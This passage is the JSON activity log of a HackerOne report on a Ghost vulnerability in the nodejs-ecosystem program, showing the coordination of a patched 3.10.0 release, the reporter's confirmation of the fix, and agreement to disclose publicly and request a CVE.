CVE.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-19T10:17:05.680Z","updated_at":"2020-02-19T10:17:05.680Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7204329,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@info_uljnf can you post a comment here when the patch has been released?","markdown_message":"\u003cp\u003e\u003ca href=\"/info_uljnf\"\u003e@info_uljnf\u003c/a\u003e can you post a comment here when the patch has been released?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-03T10:31:57.505Z","updated_at":"2020-03-03T10:31:57.505Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7205386,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@marcinhoppe Kevin here again. The patch is ready and currently in internal review. We have a release scheduled for next Monday (9th March).\n\nAs it's security-related our standard practice is to keep the patch in a private repo rather than the open source repo until just before we release so that we're not advertising the exploit before there's a release that users can upgrade to.\n\n\u003e If it's OK for you, I would like to coordinate the responsible disclosure here on HackerOne, including issuing a CVE.\n\nAbsolutely. Let me know what's required.","markdown_message":"\u003cp\u003e\u003ca href=\"/marcinhoppe\"\u003e@marcinhoppe\u003c/a\u003e Kevin here again. The patch is ready and currently in internal review. We have a release scheduled for next Monday (9th March).\u003c/p\u003e\n\n\u003cp\u003eAs it\u0026#39;s security-related our standard practice is to keep the patch in a private repo rather than the open source repo until just before we release so that we\u0026#39;re not advertising the exploit before there\u0026#39;s a release that users can upgrade to.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eIf it\u0026#39;s OK for you, I would like to coordinate the responsible disclosure here on HackerOne, including issuing a CVE.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eAbsolutely. Let me know what\u0026#39;s required.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-03T13:06:29.799Z","updated_at":"2020-03-03T13:06:29.799Z","actor":{"username":"info_uljnf","cleared":false,"url":"/info_uljnf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7214732,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It's great to hear you are already following best practices! I will request disclosure after the fix has been released on March 9th.","markdown_message":"\u003cp\u003eIt\u0026#39;s great to hear you are already following best practices! I will request disclosure after the fix has been released on March 9th.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-04T09:00:05.000Z","updated_at":"2020-03-04T09:00:05.000Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7260537,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Looks like 3.10.0 with the fix has been released.\n\n@whoareme can you confirm that the reported vulnerability has been fixed?","markdown_message":"\u003cp\u003eLooks like 3.10.0 with the fix has been released.\u003c/p\u003e\n\n\u003cp\u003e\u003ca href=\"/whoareme\"\u003e@whoareme\u003c/a\u003e can you confirm that the reported vulnerability has been fixed?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-09T11:18:54.297Z","updated_at":"2020-03-09T11:18:54.297Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7260555,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@marcinhoppe @whoareme Ghost 3.10.0 has been released and includes the fix for this issue. The relevant commit is here https://github.com/TryGhost/Ghost/commit/47739396705519a36018686894d1373e9eb92216","markdown_message":"\u003cp\u003e\u003ca href=\"/marcinhoppe\"\u003e@marcinhoppe\u003c/a\u003e \u003ca href=\"/whoareme\"\u003e@whoareme\u003c/a\u003e Ghost 3.10.0 has been released and includes the fix for this issue. The relevant commit is here \u003ca title=\"https://github.com/TryGhost/Ghost/commit/47739396705519a36018686894d1373e9eb92216\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FTryGhost%2FGhost%2Fcommit%2F47739396705519a36018686894d1373e9eb92216\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/TryGhost/Ghost/commit/47739396705519a36018686894d1373e9eb92216\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-09T11:21:06.744Z","updated_at":"2020-03-09T11:21:06.744Z","actor":{"username":"info_uljnf","cleared":false,"url":"/info_uljnf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7261461,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @marcinhoppe, @info_uljnf! Yes, it looks like this was fixed. Can we disclosure it?","markdown_message":"\u003cp\u003eHi \u003ca href=\"/marcinhoppe\"\u003e@marcinhoppe\u003c/a\u003e, \u003ca href=\"/info_uljnf\"\u003e@info_uljnf\u003c/a\u003e! Yes, it looks like this was fixed. Can we disclosure it?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-09T12:10:00.258Z","updated_at":"2020-03-09T12:10:00.258Z","actor":{"username":"whoareme","cleared":false,"url":"/whoareme","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/a40cnveew0c5l32vsa2573lvscji/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22563170EF-27F4-4176-817B-5C52C262A16C.jpeg%22%3B%20filename%2A%3DUTF-8%27%27563170EF-27F4-4176-817B-5C52C262A16C.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065414Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=4538e54d1329291b77025bbbe7346786a2c0706036c969a239a6cd32617cd769"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7261482,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Yes, I will disclose and request a CVE.","markdown_message":"\u003cp\u003eYes, I will disclose and request a CVE.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-03-09T12:11:05.029Z","updated_at":"2020-03-09T12:11:05.029Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7261485,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-09T12:11:16.028Z","updated_at":"2020-03-09T12:11:16.028Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"whoareme","url":"/whoareme"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7261493,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-09T12:11:23.377Z","updated_at":"2020-03-09T12:11:23.377Z","first_to_agree":true,"actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":7261616,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-09T12:21:11.546Z","updated_at":"2020-03-09T12:21:11.546Z","actor":{"username":"whoareme","cleared":false,"url":"/whoareme","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/a40cnveew0c5l32vsa2573lvscji/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22563170EF-27F4-4176-817B-5C52C262A16C.jpeg%22%3B%20filename%2A%3DUTF-8%27%27563170EF-27F4-4176-817B-5C52C262A16C.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065414Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=4538e54d1329291b77025bbbe7346786a2c0706036c969a239a6cd32617cd769"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7261617,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-09T12:21:11.624Z","updated_at":"2020-03-09T12:21:11.624Z","actor":{"username":"whoareme","cleared":false,"url":"/whoareme","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/a40cnveew0c5l32vsa2573lvscji/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5?response-content-disposition=inline%3B%20filename%3D%22563170EF-27F4-4176-817B-5C52C262A16C.jpeg%22%3B%20filename%2A%3DUTF-8%27%27563170EF-27F4-4176-817B-5C52C262A16C.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065414Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=4538e54d1329291b77025bbbe7346786a2c0706036c969a239a6cd32617cd769"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8316459,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","markdown_message":"","automated_response":false,"created_at":"2020-06-17T09:02:56.129Z","updated_at":"2020-06-17T09:02:56.129Z","actor":{"username":"marcinhoppe","cleared":false,"url":"/marcinhoppe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"None","new_scope":"Ghost","genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}